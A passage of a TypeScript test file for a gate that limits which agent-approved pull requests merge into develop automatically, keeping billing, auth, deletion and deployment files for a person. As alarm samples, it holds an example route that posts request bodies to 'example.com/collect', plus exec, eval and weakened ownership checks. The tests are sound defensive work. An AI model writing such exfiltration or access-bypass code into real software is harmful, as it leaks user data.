import assert from "node:assert/strict";
import test from "node:test";

import { RESERVED_DECISION_CONSTANTS, classifyPath, compileManifestPattern } from "../lib/agentAuthorityFiles.ts";
import { isPolicyTestName } from "../lib/agentPushPolicy.ts";
import {
  AMUX_DM_T2_MERGE_CONTENT_ALARMS, amuxDmT2MergeChangeVerdict, amuxDmT2MergeContentAlarmPaths, amuxDmT2MergeGate,
  amuxDmT2MergePatchGate, amuxDmT2MergeReadyVerdict,
} from "../lib/amux/dmT2MergeCore.ts";
import {
  QA_RELEASE_DM_MERGE_ALLOW_EXCEPT_PATTERNS, QA_RELEASE_DM_MERGE_ALLOW_PATTERNS, QA_RELEASE_DM_MERGE_BLOCKLIST_SCOPE_PATTERNS,
  QA_RELEASE_DM_MERGE_BLOCK_NAME_TOKENS, QA_RELEASE_DM_MERGE_BLOCK_PATTERNS, QA_RELEASE_DM_MERGE_SCOPE_ENV,
  QA_RELEASE_MERGE_LANE_GATE_PATTERNS, judgeQaReleaseMergeLaneExclusion, qaReleaseDmApprovedHumanPaths,
  qaReleaseDmMergeAllowed, qaReleaseDmMergeScope, qaReleaseMergeLaneExcludingFiles,
} from "../lib/qaReleaseMergeLaneExclusionCore.ts";
import {
  QA_RELEASE_LANE_DM_MERGE_SCOPE, qaReleaseDmApprovedPull, runQaReleaseMergeLaneRound,
} from "../lib/qaReleaseMergeLaneServiceCore.ts";

// Owner decisions 2026-11-13 ("develop 병합 권한은 DM에게 승인합니다. main은 안됩니다.")
// and 2026-11-15 ("내부 개발용 Flow입니다. 제한을 줄 이유가 없습니다. 로컬 CLI처럼
// 편리한 Flow였으면 합니다."): a Decision Maker approved pull request into develop
// merges unless it touches what a revert cannot undo; one env value goes back to
// the allow list of 2026-11-13.

const HEAD = "a".repeat(40);
const DIFF = "d".repeat(64);
const REF = "agent/engineering/700000001";
const BLOCK = "blocklist";
const ALLOW = "allowlist";

const patchOf = (path, removed = "a", added = "b", context = "") =>
  [`diff --git a/${path} b/${path}`, `--- a/${path}`, `+++ b/${path}`, `@@ -1 +1 @@${context}`, `-${removed}`, `+${added}`, ""].join("\n");

test("the scope is the block list unless the switch says otherwise, and any other value is the allow list", () => {
  assert.equal(QA_RELEASE_DM_MERGE_SCOPE_ENV, "TOMVERSE_AMUX_DM_MERGE_SCOPE");
  assert.equal(qaReleaseDmMergeScope({}), BLOCK, "on by default (owner decision 2026-11-15)");
  assert.equal(qaReleaseDmMergeScope({ [QA_RELEASE_DM_MERGE_SCOPE_ENV]: "" }), BLOCK);
  assert.equal(qaReleaseDmMergeScope({ [QA_RELEASE_DM_MERGE_SCOPE_ENV]: "blocklist" }), BLOCK);
  for (const value of ["allowlist", "off", "disabled", "false", "0", "Blocklist", " blocklist", "blocklist ", "block"]) {
    assert.equal(qaReleaseDmMergeScope({ [QA_RELEASE_DM_MERGE_SCOPE_ENV]: value }), ALLOW, `kill switch: ${JSON.stringify(value)}`);
  }
  // The pure judgements take the narrower rule when nobody says which.
  assert.equal(qaReleaseDmMergeAllowed("lib/conversationSearch.ts"), false);
  assert.equal(amuxDmT2MergeGate(["lib/conversationSearch.ts"]).pass, false);
  assert.equal(judgeQaReleaseMergeLaneExclusion({ headBranch: REF, changedFiles: [{ path: "lib/conversationSearch.ts" }],
    changedFilesComplete: true, policyTestPaths: [], agentOwnPatterns: [], dmApproved: true }).excluded, true);
  // The merge lane judges what the app reports in the block list scope: the app's reading is the one that narrows.
  assert.equal(QA_RELEASE_LANE_DM_MERGE_SCOPE, BLOCK);
});

// Product code the block list scope newly lets through: code under lib/, API routes, the rest of app/, packages.
const NEWLY_MERGEABLE = [
  "lib/conversationSearch.ts", "lib/chatComposerDraftCore.ts", "lib/generatedArtifactDocx.ts", "lib/webSearchCitations.ts",
  "lib/memoryQuery.ts", "lib/promptRefinerSuggestion.ts", "lib/workers/externalImportWorker.ts",
  "app/api/conversations/search/route.ts", "app/api/chat/context/route.ts", "app/api/images/generations/route.ts",
  "app/api/memories/route.ts", "app/api/projects/route.ts", "app/(site)/(application)/chat/ChatPageClient.tsx",
  "app/(site)/x/actions.ts", "app/globals.css", "packages/chat-core/src/streamText.ts", "types/x.d.ts",
];
// What the allow list of 2026-11-13 let through stays let through.
const ALREADY_MERGEABLE = [
  "tests/chatComposer.test.mjs", "tests/server-contract/chat-route.test.ts", "docs/guides/x.md", "docs/ops/x.md",
  "locales/en.ts", "locales/ko.ts", "components/chat/MessageBubble.tsx", "components/settings/BillingSettings.tsx",
  "app/(site)/(application)/chat/page.tsx", "app/(site)/(marketing)/pricing/page.tsx", "app/(site)/layout.tsx",
  "app/(site)/x/loading.tsx", "app/(site)/x/error.tsx",
];

test("lib/** and app/api/** product code merges on a Decision Maker approval in the block list scope", () => {
  for (const path of [...NEWLY_MERGEABLE, ...ALREADY_MERGEABLE]) {
    assert.equal(qaReleaseDmMergeAllowed(path, [], BLOCK), true, path);
  }
  for (const path of NEWLY_MERGEABLE) assert.equal(qaReleaseDmMergeAllowed(path, [], ALLOW), false, `kill switch: ${path}`);
  assert.deepEqual(amuxDmT2MergeGate([...NEWLY_MERGEABLE, ...ALREADY_MERGEABLE], BLOCK), { pass: true });
  assert.deepEqual(qaReleaseDmApprovedHumanPaths(NEWLY_MERGEABLE, [], BLOCK), []);
  // The lane, on the app's report, takes such a pull request; the same one without the report stays a person's.
  const lane = (over) => judgeQaReleaseMergeLaneExclusion({ headBranch: REF, changedFilesComplete: true, policyTestPaths: [],
    agentOwnPatterns: [], changedFiles: NEWLY_MERGEABLE.map((path) => ({ path })), dmApproved: true, dmMergeScope: BLOCK, ...over });
  assert.deepEqual(lane(), { excluded: false });
  assert.deepEqual(lane({ dmApproved: false }), { excluded: true, reasons: ["excluded_branch"] });
  assert.deepEqual(lane({ dmMergeScope: ALLOW }), { excluded: true, reasons: ["dm_outside_allowlist"] }, "kill switch");
});

// What stays a person's in the block list scope, one or more per AGENTS.md approval item.
const HUMAN = {
  realMoney: [
    "lib/modelPricing.ts", "lib/models.ts", "lib/creditLedger.ts", "lib/providerCostBudget.ts", "lib/chatCostGuardrails.ts",
    "lib/billingPlanDefaults.ts", "lib/stripePromotionProvisioning.ts", "lib/planChangeService.ts", "lib/refundSagaCore.ts",
    "lib/voiceBudgetReservation.ts", "lib/chatTokenQuotaCore.ts", "lib/subscriptionEntitlements.ts", "lib/chatRateLimitCore.ts",
    "lib/deepResearchSettlement.ts", "lib/webSearchCeilingBreachStore.ts", "lib/appSettings.ts", "lib/appDefaults.ts",
    "lib/guestChatInitialModels.ts", "lib/codePinnedModels.ts", "lib/anthropicPromptCaching.ts", "lib/providerProbe.ts",
    "lib/falImageRequest.ts", "lib/autoRouterTunables.ts", "lib/researchPreviewAdmission.ts", "lib/chatLimitDecisions.ts",
    "lib/conversationProduct.ts", "app/api/billing/checkout/route.ts", "app/api/code/managed/route.ts",
    "app/api/user/guest-usage/route.ts", "app/api/models/catalog/route.ts",
  ],
  leavingTomverse: [
    "lib/emailConsentToken.ts", "lib/billingEmails.ts", "lib/notificationDeliveryJob.ts", "lib/marketingRetention.ts",
    "lib/slackMessageTemplateCore.ts", "lib/zernioStatusQuery.ts", "lib/shareSnapshot.ts", "lib/continuationSharingPolicy.ts",
    "lib/ga4UserId.ts", "lib/analyticsConsentPolicy.ts", "lib/mobileStoreReview.ts", "app/api/webhooks/stripe/route.ts",
    "app/api/unsubscribe/route.ts", "app/api/public/shares/[shareToken]/route.ts", "app/api/_marketing/x/route.ts",
  ],
  deletingUserData: [
    "lib/accountDeletion.ts", "lib/accountDataAnonymisation.ts", "lib/memorySourceDeletion.ts", "lib/retentionPolicyCore.ts",
    "lib/memoryExpiryService.ts", "lib/scheduledJobs.ts", "lib/messageAttachmentStorage.ts", "lib/r2.ts",
    "app/api/memories/delete-all/route.ts", "app/api/user/account/route.ts", "app/api/admin/maintenance/cleanup/route.ts",
  ],
  credentialsAndSecurity: [
    "lib/auth.ts", "lib/adminAuth.ts", "lib/oauthTokenCrypto.ts", "lib/mcpConnectorSecrets.ts", "lib/mcpCustomServers.ts",
    "lib/mobileRefreshRotationCore.ts", "lib/nativeBearerGate.ts", "lib/originProtection.ts", "lib/csp.ts", "lib/apiSecurity.ts",
    "lib/conversationLock.ts", "lib/e2eTestMode.ts", "lib/inProductConsentNotice.ts", "lib/regionPinHosts.ts",
    "app/api/auth/[...nextauth]/route.ts", "app/api/consent/confirm/route.ts", "app/api/user/login-methods/route.ts",
    "app/api/conversations/[conversationId]/verify/route.ts", "app/.well-known/apple-app-site-association/route.ts",
    "app/(site)/(application)/e2e/prompt-refiner-adapter/route.ts", "proxy.ts", "lib/keys/x.pem", "config/.env.local",
  ],
  auditChain: ["lib/adminAudit.ts", "lib/adminAuditSystemActors.ts", "lib/amux/auditContract.ts", "lib/securityAuditLog.ts"],
  productionMergeAndDeploy: [
    "lib/qaReleaseMergeLaneExclusionCore.ts", "lib/qaReleaseTrainCore.ts", "lib/ciAdmissionCore.ts", "lib/developCiRepair.ts",
    "lib/deploymentCanaryLane.ts", "lib/feedbackAutoFixCore.ts", "lib/githubRepoRead.ts", "lib/releaseNotesSendDecision.ts",
    ".github/workflows/ci.yml", ".github/actions/x/action.yml", ".railway/agent-runners.ts", "railpack.json",
    "docker/x/Dockerfile", "scripts/merge-train-core.mjs", "bin/x", "tools/review-orchestrator/x.mjs",
  ],
  agentPermission: [
    "AGENTS.md", "CLAUDE.md", ".claude/agents/contract.md", ".codex/agents/x.toml", "docs/agents/agents-reference.md",
    "docs/policy/amux-decision-maker.md", "docs/ui-contracts/typography.md", "lib/agentAuthorityFiles.ts",
    "lib/agentPushPolicy.ts", "lib/engineeringAgentStore.ts", "lib/amux/dmT2MergeCore.ts", "lib/amux/x/y.ts",
    "app/api/internal/amux/x/route.ts", "app/api/admin/x/route.ts", "components/admin/AdminShell.tsx",
    "lib/autoRouterLimitedReleaseApproval.ts", "lib/supportTriageWorker.ts", "lib/scoutMemoryCohere.ts",
    "lib/crossReviewExecutors.ts", "tests/billingPolicy.test.mjs", "tests/fooContract.test.ts", "tests/mobileComposerInvariant.test.mjs",
  ],
  database: [
    "prisma/schema.prisma", "prisma/migrations/20261115000000_x/migration.sql", "docs/ops/survey.sql", "lib/x/backfill.ts",
    "lib/postgresConnectionConfigCore.mjs",
  ],
  executionEnvironment: [
    "package.json", "packages/chat-core/package.json", "packages/chat-core/tsconfig.json", "package-lock.json",
    "lib/x/package.json", "next.config.ts", "lib/vite.config.ts", "tsconfig.json", ".npmrc", "middleware.ts",
  ],
  unjudgeable: ["../etc/passwd", "/abs/x.ts", "lib//x.ts", "lib\\x.ts", "Lib/x.ts", "LIB/x.ts", "", 7, null],
  caseNeverSlipsThrough: ["lib/AMUX/x.ts", "lib/CreditX.ts", "lib/ModelPricing.ts", "App/api/x/route.ts", "lib/x/ADMIN.ts"],
};

test("whatever a revert cannot undo stays a person's in the block list scope, in every category of AGENTS.md's list", () => {
  for (const [category, paths] of Object.entries(HUMAN)) {
    for (const path of paths) {
      assert.equal(qaReleaseDmMergeAllowed(path, [], BLOCK), false, `${category}: ${String(path)}`);
      // The kill switch never takes what the block list scope leaves, except the raw SQL under docs/ it always took.
      if (path !== "docs/ops/survey.sql") {
        assert.equal(qaReleaseDmMergeAllowed(path, [], ALLOW), false, `${category} (kill switch): ${String(path)}`);
      }
    }
  }
  // One such path among product code leaves the whole pull request to a person, and names that path.
  for (const path of HUMAN.realMoney.slice(0, 5)) {
    assert.deepEqual(amuxDmT2MergeGate([...NEWLY_MERGEABLE, path], BLOCK), { pass: false, reason: "outside_dm_merge_allowlist", paths: [path] });
    assert.deepEqual(judgeQaReleaseMergeLaneExclusion({ headBranch: REF, changedFilesComplete: true, policyTestPaths: [],
      agentOwnPatterns: [], dmApproved: true, dmMergeScope: BLOCK,
      changedFiles: [...NEWLY_MERGEABLE.map((p) => ({ path: p })), { path }] }), { excluded: true, reasons: ["dm_outside_allowlist"] }, path);
  }
  // Both sides of a rename are judged.
  assert.deepEqual(judgeQaReleaseMergeLaneExclusion({ headBranch: REF, changedFilesComplete: true, policyTestPaths: [],
    agentOwnPatterns: [], dmApproved: true, dmMergeScope: BLOCK,
    changedFiles: [{ path: "lib/conversationSearch.ts", previousPath: "lib/creditLedger.ts" }] }),
    { excluded: true, reasons: ["dm_outside_allowlist"] });
  assert.deepEqual(qaReleaseMergeLaneExcludingFiles({ headBranch: REF, changedFilesComplete: true, policyTestPaths: [],
    agentOwnPatterns: [], dmApproved: true, dmMergeScope: BLOCK, changedFiles: [{ path: "lib/conversationSearch.ts" },
      { path: "lib/auth.ts" }] }), [{ path: "lib/auth.ts", reasons: ["dm_outside_allowlist"] }]);
  // A test the policy documents name, when the caller read them.
  assert.equal(qaReleaseDmMergeAllowed("tests/chatComposer.test.mjs", ["tests/chatComposer.test.mjs"], BLOCK), false);
  // Paths that cannot be read, or none, go to a person.
  assert.deepEqual(amuxDmT2MergeGate(null, BLOCK), { pass: false, reason: "paths_unreadable", paths: [] });
  assert.deepEqual(amuxDmT2MergeGate([], BLOCK), { pass: false, reason: "paths_unreadable", paths: [] });
});

test("every block list entry blocks on its own, whatever the case", () => {
  const sample = (pattern) => pattern.replace(/^\*\*\//, "lib/x/").replace("/**", "/x/y.ts").replaceAll("*", "x");
  for (const pattern of [...QA_RELEASE_MERGE_LANE_GATE_PATTERNS, ...QA_RELEASE_DM_MERGE_BLOCK_PATTERNS,
    ...QA_RELEASE_DM_MERGE_BLOCKLIST_SCOPE_PATTERNS]) {
    const path = sample(pattern);
    assert.ok(compileManifestPattern(pattern).test(path), `${pattern} -> ${path}`);
    assert.equal(qaReleaseDmMergeAllowed(path, [], BLOCK), false, pattern);
    assert.equal(qaReleaseDmMergeAllowed(path.toUpperCase().replace(/^LIB\//, "lib/"), [], BLOCK), false, `${pattern} upper`);
  }
  for (const token of QA_RELEASE_DM_MERGE_BLOCK_NAME_TOKENS) {
    assert.equal(token, token.toLowerCase(), token);
    for (const path of [`lib/x${token}y.ts`, `lib/X${token.toUpperCase()}Y.ts`, `app/api/${token}/route.ts`]) {
      assert.equal(qaReleaseDmMergeAllowed(path, [], BLOCK), false, `${token}: ${path}`);
    }
  }
  // The values AGENTS.md reserves for a person are defined only in files that stay a person's.
  for (const { name, definedIn } of RESERVED_DECISION_CONSTANTS) {
    for (const path of definedIn) assert.equal(qaReleaseDmMergeAllowed(path, [], BLOCK), false, `${name}: ${path}`);
  }
});

test("the kill switch is exactly the allow list of 2026-11-13", () => {
  const exceptMatchers = QA_RELEASE_DM_MERGE_ALLOW_EXCEPT_PATTERNS.map((p) => new RegExp(compileManifestPattern(p).source, "i"));
  const blockMatchers = [...QA_RELEASE_MERGE_LANE_GATE_PATTERNS, ...QA_RELEASE_DM_MERGE_BLOCK_PATTERNS]
    .map((p) => new RegExp(compileManifestPattern(p).source, "i"));
  const before = (path) => QA_RELEASE_DM_MERGE_ALLOW_PATTERNS.some((p) => compileManifestPattern(p).test(path)) &&
    !exceptMatchers.some((m) => m.test(path)) && classifyPath(path) === "product" && !isPolicyTestName(path) &&
    !blockMatchers.some((m) => m.test(path));
  const paths = [...NEWLY_MERGEABLE, ...ALREADY_MERGEABLE, ...Object.values(HUMAN).flat().filter((p) => typeof p === "string"),
    "docs/ops/survey.sql", "docs/ops/router-human-review/key-recipient.pub.pem", "components/x/billingNotice.tsx",
    "tests/fixtures/x/package.json", "locales/billing.ts"];
  for (const path of paths) assert.equal(qaReleaseDmMergeAllowed(path, [], ALLOW), before(path), path);
  // The block list scope takes everything the allow list took, except raw SQL, key material and manifests.
  for (const path of paths) {
    if (before(path) && !/\.(?:sql|pem)$|package\.json$/.test(path)) assert.equal(qaReleaseDmMergeAllowed(path, [], BLOCK), true, path);
  }
  assert.equal(qaReleaseDmMergeAllowed("docs/ops/survey.sql", [], BLOCK), false);
  assert.equal(qaReleaseDmMergeAllowed("docs/ops/survey.sql", [], ALLOW), true, "as before");
});

test("what a path cannot say: the approved patch's changed lines and hunk context sound the alarm", () => {
  const ordinary = patchOf("lib/conversationSearch.ts", "const limit = 10;", "const limit = 12;");
  assert.deepEqual(amuxDmT2MergePatchGate(ordinary, BLOCK), { pass: true });
  const alarmed = [
    // The values AGENTS.md reserves for a person.
    ["creditWeight: 2,", "creditWeight: 3,"], ["maxOutputTokens: 4096,", "maxOutputTokens: 8192,"],
    ["reservationOutputTokens: 1", "reservationOutputTokens: 2"], ["const productKey = a;", "const productKey = b;"],
    // Money.
    ["const x = price * 1;", "const x = price * 2;"], ["await chargeCredits(user);", ""], ["", "return { budgetCents: 0 };"],
    // A default-off switch turned on.
    ['enabled = process.env.X === "on";', 'enabled = process.env.X !== "off";'],
    ['env[FEATURE_ENV] === "enabled"', 'env[FEATURE_ENV] !== "disabled"'], ["", "const s = TOMVERSE_NEW_THING;"],
    ["", "await tx.appSetting.upsert(x);"],
    // Deletion and raw SQL.
    ["", "await tx.message.deleteMany({ where });"], ["", "await prisma.$executeRaw`UPDATE x`;"],
    ["", "export async function DELETE(request: Request) {"], ["", "// purge old rows"],
    // Authentication and secrets.
    ["const session = await auth();", ""], ["if (!user) return unauthorized();", "requireAdminSession();"],
    ["", "const apiKey = read();"], ["", "headers.cookie = value;"],
    // Mail, and markup the browser runs.
    ["", "await sendWelcomeEmail(user);"], ["", "<div dangerouslySetInnerHTML={x} />"],
    // Review r-20261115-115539-709020: anything leaving by a call of its own, another process, run-time code.
    ["", 'await fetch("https://example.com/collect", { method: "POST", body: await request.text() });'],
    ["", "const ws = new WebSocket(url);"], ["", "navigator.sendBeacon(u, b);"], ["", "await axios.post(u, b);"],
    ["", 'const { exec } = require("child_process");'], ["", "spawn(cmd, args);"], ["", "eval(code);"],
    ["", "const mod = await import(name);"], ["", "// see https://example.com/docs"],
    // Data at rest: a query decides whose rows it touches; the file system.
    ["", "return Response.json(await prisma.conversation.findMany());"], ["", "await tx.project.update({ where: { id }, data });"],
    ["", 'import { prisma } from "@/lib/prisma";'], ["", "await writeFile(path, body);"],
  ];
  for (const [removed, added] of alarmed) {
    const patch = patchOf("lib/conversationSearch.ts", removed, added);
    assert.deepEqual(amuxDmT2MergePatchGate(patch, BLOCK), { pass: false, reason: "outside_dm_merge_allowlist",
      paths: ["lib/conversationSearch.ts"] }, `${removed} -> ${added}`);
  }
  // The function a hunk sits in, as Git names it, counts too.
  assert.equal(amuxDmT2MergePatchGate(patchOf("lib/conversationSearch.ts", "a", "b", " export async function DELETE(request) {"), BLOCK).pass, false);
  assert.equal(amuxDmT2MergePatchGate(patchOf("lib/conversationSearch.ts", "a", "b", " function debitCredits(user) {"), BLOCK).pass, false);
  // Unchanged context lines sound only the authorization and ownership alarms.
  const hunk = (header, lines) => ["diff --git a/lib/memoryService.ts b/lib/memoryService.ts", `@@ -10,5 +10,5 @@${header}`,
    ...lines, ""].join("\n");
  assert.deepEqual(amuxDmT2MergePatchGate(hunk("", [" const total = items.length;", "-const limit = 10;", "+const limit = 12;",
    " process.env.X;"]), BLOCK), { pass: true });
  // Review r-20261115-112039-771ce1: an ownership check weakened with no keyword on the added line.
  const weakened = [" const item = await tx.memory.findFirst({ where: { id } });", "-  if (!item || item.userId !== userId) {",
    "+  if (!item) {", "     throw new ApiSecurityError(\"not_found\", 404);", "   }"];
  assert.deepEqual(amuxDmT2MergePatchGate(hunk(" export async function loadOwnedMemory(tx, userId, id) {", weakened), BLOCK),
    { pass: false, reason: "outside_dm_merge_allowlist", paths: ["lib/memoryService.ts"] });
  // Each of its three signals alone is enough: the removed line, the unchanged guard beside it, the function's name.
  assert.equal(amuxDmT2MergePatchGate(hunk("", ["-  if (!item || item.userId !== userId) {", "+  if (!item) {"]), BLOCK).pass, false);
  assert.equal(amuxDmT2MergePatchGate(hunk("", ["-  if (!item || item.u !== u) {", "+  if (!item) {",
    "     throw new ApiSecurityError(\"not_found\", 404);"]), BLOCK).pass, false);
  assert.equal(amuxDmT2MergePatchGate(hunk(" export async function loadOwnedMemory(tx, u, id) {",
    ["-  if (!item || item.u !== u) {", "+  if (!item) {"]), BLOCK).pass, false);
  for (const guard of [" return NextResponse.json({ error: \"forbidden\" }, { status: 403 });", " const viewer = await requireUser(request);",
    " if (!canEditProject(viewer, project)) {", " where: { id, ownerId: viewer.id },", " const session = await auth();"]) {
    assert.equal(amuxDmT2MergePatchGate(hunk("", ["-const limit = 10;", "+const limit = 12;", guard]), BLOCK).pass, false, guard);
  }
  // Review r-20261115-112803-cbb35d: an access check made a no-op.
  assert.equal(amuxDmT2MergePatchGate(hunk(" function noteGrant(access) {", ["-  return access.granted;", "+  return true;"]), BLOCK).pass, false);
  assert.equal(amuxDmT2MergePatchGate(hunk("", ["-  return a.granted;", "+  return true;"]), BLOCK).pass, false);
  // A file the allow list took is judged by its path alone, as before, on both sides of a rename.
  assert.deepEqual(amuxDmT2MergePatchGate(patchOf("components/settings/SessionList.tsx", "a", "const session = useSession();"), BLOCK),
    { pass: true });
  const renamed = ["diff --git a/components/X.tsx b/lib/conversationSearch.ts", "similarity index 90%",
    "rename from components/X.tsx", "rename to lib/conversationSearch.ts", "@@ -1 +1 @@", "-a", "+if (process.env.X) b", ""].join("\n");
  assert.deepEqual(amuxDmT2MergePatchGate(renamed, BLOCK).paths, ["lib/conversationSearch.ts"]);
  // Not plain text: binary, an executable bit, a symlink, a submodule.
  const header = (lines) => ["diff --git a/lib/x.ts b/lib/x.ts", ...lines, ""].join("\n");
  for (const lines of [["Binary files a/lib/x.ts and b/lib/x.ts differ"], ["index 1111111..2222222", "GIT binary patch", "literal 1"],
    ["old mode 100644", "new mode 100755"], ["new file mode 100755", "index 0000000..1111111", "@@ -0,0 +1 @@", "+a"],
    ["new file mode 120000", "index 0000000..1111111"], ["index 1111111..2222222 160000", "@@ -1 +1 @@",
      "-Subproject commit 1111111111111111111111111111111111111111", "+Subproject commit 2222222222222222222222222222222222222222"]]) {
    assert.deepEqual(amuxDmT2MergeContentAlarmPaths(header(lines)), ["lib/x.ts"], lines.join(" | "));
  }
  assert.deepEqual(amuxDmT2MergeContentAlarmPaths(header(["new file mode 100644", "index 0000000..1111111", "@@ -0,0 +1 @@", "+a"])), []);
  // Only the alarmed file is named; a path the scope leaves to a person is named first, from the path gate.
  const two = patchOf("lib/conversationSearch.ts") + patchOf("lib/webSearchCitations.ts", "a", "await sendMail(x);");
  assert.deepEqual(amuxDmT2MergePatchGate(two, BLOCK), { pass: false, reason: "outside_dm_merge_allowlist", paths: ["lib/webSearchCitations.ts"] });
  assert.deepEqual(amuxDmT2MergePatchGate(patchOf("lib/creditLedger.ts"), BLOCK).paths, ["lib/creditLedger.ts"]);
  // No patch: nothing to judge.
  assert.deepEqual(amuxDmT2MergePatchGate(null, BLOCK), { pass: false, reason: "paths_unreadable", paths: [] });
  // The kill switch judges paths alone, as before: a component's lines are not read.
  assert.deepEqual(amuxDmT2MergePatchGate(patchOf("components/X.tsx", "a", "process.env.X"), ALLOW), { pass: true });
  assert.equal(amuxDmT2MergePatchGate(patchOf("lib/conversationSearch.ts"), ALLOW).pass, false);
  // The engineering agent's decision values are among the alarms, so the two lists never drift apart.
  for (const name of ["creditWeight", "maxOutputTokens", "reservationOutputTokens", "DEFAULT_MODEL_ID", "discountAmountCents"]) {
    assert.ok(AMUX_DM_T2_MERGE_CONTENT_ALARMS.some((alarm) => alarm.test(name)), name);
  }
});

test("the app's fresh read holds only while the approved patch still passes, and never for main", () => {
  const approved = { prNumber: 42, headRef: REF, approvedHeadSha: HEAD, approvedDiffDigest: DIFF };
  const change = (over = {}) => ({ state: "open", baseRef: "develop", headRef: REF, headSha: HEAD, diffDigest: DIFF,
    crossRepository: false, changedFiles: ["lib/conversationSearch.ts", "app/api/conversations/search/route.ts"], ...over });
  const patch = patchOf("lib/conversationSearch.ts") + patchOf("app/api/conversations/search/route.ts");
  const files = new Map([["lib/conversationSearch.ts", "export const limit = 12;\n"],
    ["app/api/conversations/search/route.ts", "export async function GET() { return Response.json([]); }\n"]]);
  const verdict = (over = {}) => amuxDmT2MergeChangeVerdict({ approved, change: change(), scope: BLOCK, patch, files, ...over });
  assert.deepEqual(verdict(), { holds: true });
  // Review r-20261115-112803-cbb35d: the whole file at the approved head is read; one that speaks of access anywhere is a person's.
  assert.deepEqual(verdict({ files: new Map([...files, ["lib/conversationSearch.ts",
    "function noteGrant(access) {\n  return true;\n}\nexport const limit = 12;\n"]]) }),
    { holds: false, reason: "outside_dm_merge_allowlist", paths: ["lib/conversationSearch.ts"] });
  for (const text of ["const row = await tx.memory.findFirst({ where: { id, userId } });", "if (!session) return null;",
    "const cents = 0;", "process.env.FLAG", "await sendReceiptEmail(x);", "await tx.x.deleteMany({});",
    // Review r-20261115-115539-709020, as the reviewer wrote it.
    'export async function POST(request: Request) { await fetch("https://example.com/collect", { method: "POST", body: await request.text() }); return Response.json({ ok: true }); }',
    "export async function GET() { return Response.json(await prisma.project.findMany()); }"]) {
    assert.equal(verdict({ files: new Map([...files, ["lib/conversationSearch.ts", text]]) }).holds, false, text);
  }
  // The reviewed case end to end: a new POST in app/api/projects/route.ts that sends the request body outside.
  const exfil = 'export async function POST(request: Request) { await fetch("https://example.com/collect", { method: "POST", body: await request.text() }); return Response.json({ ok: true }); }';
  const route = "app/api/projects/route.ts";
  assert.equal(qaReleaseDmMergeAllowed(route, [], BLOCK), true, "the path alone would merge");
  assert.deepEqual(amuxDmT2MergeChangeVerdict({ approved, change: change({ changedFiles: [route] }), scope: BLOCK,
    patch: patchOf(route, "export {};", exfil), files: new Map([[route, exfil]]) }),
    { holds: false, reason: "outside_dm_merge_allowlist", paths: [route] });
  // A file not read, gone at the head, or no files at all: a person's.
  assert.deepEqual(verdict({ files: undefined }), { holds: false, reason: "paths_unreadable",
    paths: ["lib/conversationSearch.ts", "app/api/conversations/search/route.ts"] });
  assert.deepEqual(verdict({ files: new Map([...files, ["lib/conversationSearch.ts", null]]) }),
    { holds: false, reason: "paths_unreadable", paths: ["lib/conversationSearch.ts"] });
  // Files the allow list took need no read.
  assert.deepEqual(amuxDmT2MergeChangeVerdict({ approved, change: change({ changedFiles: ["components/X.tsx"] }), scope: BLOCK,
    patch: patchOf("components/X.tsx") }), { holds: true });
  assert.deepEqual(verdict({ scope: ALLOW }), { holds: false, reason: "outside_dm_merge_allowlist",
    paths: ["lib/conversationSearch.ts", "app/api/conversations/search/route.ts"] }, "kill switch");
  assert.deepEqual(verdict({ patch: null }), { holds: false, reason: "paths_unreadable", paths: [] });
  assert.deepEqual(verdict({ patch: undefined }), { holds: false, reason: "paths_unreadable", paths: [] });
  assert.deepEqual(verdict({ patch: patchOf("lib/conversationSearch.ts", "a", "process.env.FLAG") }),
    { holds: false, reason: "outside_dm_merge_allowlist", paths: ["lib/conversationSearch.ts"] });
  assert.deepEqual(verdict({ change: change({ changedFiles: ["lib/conversationSearch.ts", "lib/creditLedger.ts"] }) }),
    { holds: false, reason: "outside_dm_merge_allowlist", paths: ["lib/creditLedger.ts"] });
  // Never main, whatever the scope.
  assert.deepEqual(verdict({ change: change({ baseRef: "main" }) }), { holds: false, reason: "base_not_develop" });
  const pull = (over = {}) => ({ open: true, draft: true, base: "develop", head: REF, headSha: HEAD, fork: false, ...over });
  const ready = (p, over = {}) => amuxDmT2MergeReadyVerdict({ approved, pull: p, change: change(), scope: BLOCK, patch, files, ...over });
  assert.deepEqual(ready(pull()), { verdict: "ready" });
  assert.deepEqual(ready(pull({ base: "main" })), { verdict: "skip", reason: "base_not_develop" });
  assert.deepEqual(ready(pull({ labels: ["ci:hold"] })), { verdict: "skip", reason: "ci_hold" }, "a person's hold stands");
  assert.deepEqual(ready(pull({ labels: ["main:next"] })), { verdict: "ready" });
  assert.deepEqual(ready(pull(), { scope: ALLOW }).verdict, "skip", "kill switch");
  assert.deepEqual(ready(pull(), { patch: patchOf("lib/conversationSearch.ts", "a", "await tx.x.deleteMany()") }),
    { verdict: "skip", reason: "outside_dm_merge_allowlist", paths: ["lib/conversationSearch.ts"] });
  // The lane's own check of the app's report: never a pull request into main.
  const state = { dmApproved: [{ number: 42, headSha: HEAD, headRef: REF }] };
  assert.equal(qaReleaseDmApprovedPull(state, { number: 42, headRefOid: HEAD, headRefName: REF, baseRefName: "develop",
    isCrossRepository: false }), true);
  assert.equal(qaReleaseDmApprovedPull(state, { number: 42, headRefOid: HEAD, headRefName: REF, baseRefName: "main",
    isCrossRepository: false }), false);
});

test("a lane round merges a reported lib/ and app/api/ change into develop, and never touches a pull request into main", async () => {
  const ENV = {
    QA_RELEASE_MERGE_LANE_SECRET: "s".repeat(40), QA_RELEASE_MERGE_LANE_APP_ID: "123",
    QA_RELEASE_MERGE_LANE_APP_PRIVATE_KEY: "key", QA_RELEASE_MERGE_LANE_RAILWAY_TOKEN: "token",
    QA_RELEASE_MERGE_LANE_ENABLED: "true", QA_RELEASE_MERGE_LANE_KILL_SWITCH: "", QA_RELEASE_CONTROL_REVISION: "4",
  };
  const GREEN = [{ __typename: "CheckRun", status: "COMPLETED", conclusion: "SUCCESS", workflowName: "PR Fast Gate" }];
  const pullOf = (over = {}) => ({ number: 42, createdAt: "2026-11-15T00:00:00Z", baseRefName: "develop", headRefName: REF,
    isCrossRepository: false, headRefOid: HEAD, isDraft: false, mergeable: "MERGEABLE", state: "OPEN", statusCheckRollup: GREEN,
    merged: false, mergeCommitSha: null, ...over });
  const run = async (pull, files) => {
    const issued = [];
    const merges = [];
    const ports = {
      app: {
        readState: async () => ({ dbNowMs: 1, latched: false, openAttempt: null,
          dmApproved: [{ number: pull.number, headSha: HEAD, headRef: REF }] }),
        issue: async (request) => { issued.push(request); return { issued: true, attemptId: "att-1" }; },
        consume: async () => ({ consumed: true }),
        report: async () => ({ recorded: true }),
      },
      github: {
